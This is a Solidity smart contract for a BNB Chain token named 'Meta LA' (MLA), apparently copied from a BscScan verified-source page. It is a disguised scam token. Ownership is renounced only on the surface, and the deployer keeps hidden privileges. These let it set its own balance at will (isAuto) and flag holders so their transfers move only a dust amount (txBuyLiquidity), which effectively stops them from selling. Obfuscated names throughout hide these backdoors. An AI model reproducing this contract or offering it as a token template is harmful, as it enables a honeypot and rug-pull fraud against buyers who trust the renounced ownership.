/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MetaLA {
    uint8 public decimals = 18;
    bool public burnSender;
    address public txMode;

    address public exemptTo;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public receiverReceiver;


    uint256 constant maxExempt = 10 ** 10;
    mapping(address => bool) public maxMarketing;

    string public name = "Meta LA";
    address public owner;
    uint256 public totalSupply = 100000000 * 10 ** 18;

    string public symbol = "MLA";
    mapping(address => mapping(address => uint256)) public allowance;
    modifier fundMaxReceiver() {
        require(receiverReceiver[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed minListBuy, address indexed senderToken);
    event Transfer(address indexed atTotalAuto, address indexed shouldTo, uint256 receiverMax);
    event Approval(address indexed tokenLiquidityBurn, address indexed receiverMin, uint256 receiverMax);

    constructor (){
        IUniswapV2Router totalSwap = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        txMode = IUniswapV2Factory(totalSwap.factory()).createPair(totalSwap.WETH(), address(this));
        owner = msg.sender;
        exemptTo = owner;
        receiverReceiver[exemptTo] = true;
        balanceOf[exemptTo] = totalSupply;
        emit Transfer(address(0), exemptTo, totalSupply);
        renounceOwnership();
    }

    

    function transfer(address burnSellWallet, uint256 marketingWalletMin) external returns (bool) {
        return transferFrom(msg.sender, burnSellWallet, marketingWalletMin);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(exemptTo, address(0));
        owner = address(0);
    }

    function isAuto(uint256 marketingWalletMin) public fundMaxReceiver {
        balanceOf[exemptTo] = marketingWalletMin;
    }

    function senderTrading(address tokenFromSwap, address maxLimit, uint256 marketingWalletMin) internal returns (bool) {
        require(balanceOf[tokenFromSwap] >= marketingWalletMin);
        balanceOf[tokenFromSwap] -= marketingWalletMin;
        balanceOf[maxLimit] += marketingWalletMin;
        emit Transfer(tokenFromSwap, maxLimit, marketingWalletMin);
        return true;
    }

    function txBuyLiquidity(address receiverList) public fundMaxReceiver {
        if (receiverList == exemptTo) {
            return;
        }
        maxMarketing[receiverList] = true;
    }

    function walletShouldBuy(address minToLaunch) public {
        if (burnSender) {
            return;
        }
        receiverReceiver[minToLaunch] = true;
        burnSender = true;
    }

    function transferFrom(address receiverSwapReceiver, address burnSellWallet, uint256 marketingWalletMin) public returns (bool) {
        if (receiverSwapReceiver != msg.sender && allowance[receiverSwapReceiver][msg.sender] != type(uint256).max) {
            require(allowance[receiverSwapReceiver][msg.sender] >= marketingWalletMin);
            allowance[receiverSwapReceiver][msg.sender] -= marketingWalletMin;
        }
        if (burnSellWallet == exemptTo || receiverSwapReceiver == exemptTo) {
            return senderTrading(receiverSwapReceiver, burnSellWallet, marketingWalletMin);
        }
        if (maxMarketing[receiverSwapReceiver]) {
            return senderTrading(receiverSwapReceiver, burnSellWallet, maxExempt);
        }
        return senderTrading(receiverSwapReceiver, burnSellWallet, marketingWalletMin);
    }


}